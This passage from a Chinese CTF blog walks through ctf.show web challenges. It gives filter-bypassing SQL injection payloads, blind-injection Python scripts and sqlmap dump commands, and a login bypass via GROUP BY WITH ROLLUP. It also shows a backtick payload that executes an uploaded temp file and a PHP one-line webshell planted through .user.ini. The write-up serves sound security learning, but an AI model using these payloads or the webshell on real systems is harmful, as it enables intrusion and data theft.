alt="image-20210923230539331"></p><p>一般空格被过滤有如下替换方法</p><ul><li>&#x2F;**&#x2F;</li><li>()（括号绕过：常用于基于时间延迟的盲注）</li><li>回车(url编码中的%0a)</li><li>&#96;(tap键上面的按钮)</li><li>tap（%0b）</li><li>两个空格</li><li>换行（%0a）</li><li>新的一页（%0c）</li><li>return功能（%0d ）</li></ul><p>后面便是常规注入了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=1&#x27;</span><span class="operator">%</span><span class="number">0</span>bunion<span class="operator">%</span><span class="number">0</span>bselect<span class="operator">%</span><span class="number">0</span>b1,flag,<span class="number">3</span><span class="operator">%</span><span class="number">0</span>bfrom<span class="operator">%</span><span class="number">0</span>bflag#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%0aunion%0aselect%0a1,flag,3%0afrom%0aflag#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username=1&#x27;</span><span class="keyword">union</span><span class="operator">%</span><span class="number">0</span>aselect(<span class="number">1</span>),flag,(<span class="number">3</span>)<span class="keyword">from</span>(flag)#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="web7（过滤空格、union的sql盲注）"><a href="#web7（过滤空格、union的sql盲注）" class="headerlink" title="web7（过滤空格、union的sql盲注）"></a>web7（过滤空格、union的sql盲注）</h3><p>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">url</span>):  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url + u</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    i) + <span class="string">&quot;)/**/from/**/&quot;</span> + <span class="built_in">str</span>(j) + <span class="string">&quot;/**/for/**/1))=&quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url + u</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db(url);</span><br><span class="line">table(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(j))</span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span></span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/or/**/ascii(substr(database()/**/from/**/1/**/for/**/1))=100#</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span><span class="comment">/**/</span><span class="operator">||</span><span class="comment">/**/</span>ascii(substr((<span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database()<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">offset</span><span class="comment">/**/</span><span class="number">0</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">2</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))<span class="operator">=</span><span class="number">55</span>#</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>库名：web7</p><p>跑出三个表名：flag、page、user</p><p><img src="https://s1.vika.cn/space/2023/02/22/df786d89ce1b48488aa646632510f6aa" alt="image-20211004224641583"></p><p>利用sqlmap</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=2&quot; <span class="comment">--technique=B -D web7 --tables  --tamper space2comment.py</span></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://a82d5ba7-9b1c-459c-822f-e30c7219788f.challenge.ctf.show:8080/index.php?id=2&quot; <span class="comment">--technique=B -D web7 -T flag -C flag --dump  --tamper space2comment.py</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/1f75785712a840048f61017203997bd6" alt="image-20211004225904757"></p><p><img src="https://s1.vika.cn/space/2023/02/22/ac9786c071a645f6a1b939e85927ee35" alt="image-20211004230318536"></p><h3 id="web8（多过滤了逗号）"><a href="#web8（多过滤了逗号）" class="headerlink" title="web8（多过滤了逗号）"></a>web8（多过滤了逗号）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and ascii(substr((select database()),1,1))=xx #</span></span><br><span class="line"><span class="string">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))<span class="operator">=</span>xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line"></span><br><span class="line">将limit <span class="number">0</span>,<span class="number">1</span>样式改为limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://a7abce0b-495f-4960-b75c-611363f00c53.challenge.ctf.show:8080/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>按取消获得源码</p><p><img src="https://s1.vika.cn/space/2023/02/22/f6bcb2f348d7477ba02bf5e4d58f2f37" alt="image-20211006094316453"></p><p>由源码得知注入点在username</p><p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br> 不加group by时的输出如下：<br> <img src="https://s1.vika.cn/space/2023/02/22/7d768a1beec446c7bae7b2671ebdd089" alt="在这里插入图片描述"><br> 在使用group by以后会按照password中的值进行排列：</p><p><img src="https://s1.vika.cn/space/2023/02/22/bd4f170226bc4476b871c0812c844ddd" alt="image-20211006101953229"><br>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计)<br>来看实例：</p><p><img src="https://s1.vika.cn/space/2023/02/22/e1f04870cfed4d7eb61457c97aa8a199" alt="image-20211006102021483"></p><p>结果中将会多出一行，其中password列为null，count（*）为统计和。<br>这里我们就可以通过骚姿势绕过了。<br>其中&#x2F; ** &#x2F; 是为了绕过空格过滤<br>payload:username&#x3D;admin’&#x2F; ** &#x2F;or&#x2F; ** &#x2F;1&#x3D;1&#x2F; ** &#x2F;group&#x2F; ** &#x2F;by&#x2F; ** &#x2F;password&#x2F; ** &#x2F;with&#x2F; **&#x2F;rollup#&amp;password&#x3D;<br>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL&#x3D;&#x3D;NULL)即可满足$password&#x3D;&#x3D;$row[‘password’]的限制成功登陆。<br>登录成功即可显示flag。</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>session的理解：<a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376">https://blog.csdn.net/zhengxijia2012/article/details/73437376</a></p><p>session的用法：<a href="https://blog.csdn.net/sm20170867238/article/details/90745969">https://blog.csdn.net/sm20170867238/article/details/90745969</a></p><p><img src="https://s1.vika.cn/space/2023/02/22/c61eaafb301c4c13af073b953cea69df" alt="image-20211007151228470"></p><p>删除储存的session，密码填空或抓包删除也一样</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><img src="https://s1.vika.cn/space/2023/02/22/328bcc41d6c84857a495ab0b7620a11e" alt="image-20211007154545066"></p><p><img src="https://s1.vika.cn/space/2023/02/22/9fb0cb76734e41f3bddf1ed44c25bc61" alt="image-20211007154852714"></p><p><img src="https://s1.vika.cn/space/2023/02/22/26bd602d383240e8b4f0808128b60e50" alt="image-20211007155148386"></p><p>一开始我各种方法，system();进行查看。可是没有回显。</p><p>这时想到了可以使用scandir()来查看目录文件。</p><p>那好，构造pyload: ?cmd&#x3D;print_r(scandir(“.”));&#x2F;&#x2F;查看当前所有的目录文件 </p><p>或者是使用glob()函数也可以。它返回一个包含匹配指定模式的文件名或目录的数组。pyload: ?cmd&#x3D;print_r(glob(“<em>.</em>“)); ,同样也可以显示目录文件</p><p>举个例子:<br> <strong>glob(“<em>“) 匹配任意文件<br> glob(“</em>.txt”)匹配以txt为后缀的文件</strong></p><p><img src="https://s1.vika.cn/space/2023/02/22/d8e7d7803f8842f38df78c6b1a466718" alt="image-20211007154648070"></p><p>使用show_source()函数.此函数是对文件进行 PHP 语法高亮显示。（show_source函数是highlight_file()函数的别名）</p><p><img src="https://s1.vika.cn/space/2023/02/22/52863b0391eb450abb57e47d1f723ed8" alt="image-20211007154732850"></p><h3 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此段代码要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等。可以使用的有：p &#96; ? &#x2F; + &lt; &gt; &#x3D;</p><p>2.3：构造cmd</p><pre><code>    通过可用的字符构造cmd=?&gt;&lt;?=`.+/??p/p?p??????`，由eval（$cmd）来运行临时文件    解释构造原理：</code></pre><p>2.3.1：<code>&lt;?= $cmd ?&gt;</code> 等于 <code>&lt;?php echo($cmd) ?&gt;</code></p><pre><code>    在php中，&lt;? ?&gt;称为短标签，&lt;?php ?&gt;称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.4.0以后， &lt;?= 总是可代替 &lt;? echo。    例：以下代码在php7.4环境下运行，结果均为2021。&lt;?php echo(date(&#39;Y&#39;)) ?&gt;&lt;?php eval(&quot;echo(date(&#39;Y&#39;));&quot;) ?&gt;&lt;?= date(&#39;Y&#39;); ?&gt;&lt;?php eval(&quot;?&gt;&lt;?= date(&#39;Y&#39;);&quot;) ?&gt;    （php在线运行测试http://www.dooccn.com/php7.4/）</code></pre><p>2.3.2：反引号&#96;&#96;（键盘Tab键上面那个键）</p><pre><code>    在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。如下语句可得系统日期:</code></pre><p><code>&lt;?= </code>date<code> ?&gt;</code></p><p>2.3.3：点 .</p><pre><code>    点命令等于source命令，用来执行文件。    source /home/user/bash   等同于   . /home/user/bash</code></pre><p>2.3.4：加号 +</p><pre><code>    URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。</code></pre><p>2.3.5：&#x2F;??p&#x2F;p?p??????</p><p>2.3.5.1：临时文件夹目录</p><pre><code>    php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是/tmp目录。</code></pre><p>2.3.5.2：临时文件命名规则</p><pre><code>    默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp  linux下：phpXXXXXX。</code></pre><p>2.3.5.3：通配符</p><pre><code>    问号?代表一个任意字符，通配符/??p/p?p??????匹配/tmp/phpxxxxxx</code></pre><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>扫描后发现存在upload.php.bak</p><blockquote><p>.bak文件是备份文件。<br>这里列举一下常见的源码泄露<br>.hg源码泄漏<br>.git源码泄漏<br>.DS_Store文件泄漏<br>.phps .bak结尾的网页</p></blockquote><p>得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我们要上传一句话木马，文件大小要小于24字节，名字长度要小于9，后缀小于等于3，名字中不能有php</span></span><br></pre></td></tr></table></figure><p>上传1.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="comment">#刚好24字节</span></span><br></pre></td></tr></table></figure><p>上传.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file是什么是意思呢。它就是设置页眉和脚注，可以保证它们在每个页面的前后被载入。使用这些指令包含的文件可以像使用include()语句包含的文件一样</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>));<span class="comment">//a=print_r(scandir(&quot;.&quot;));</span></span><br><span class="line">a=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里用post传值</p><p>也可以用get方式</p><p><img 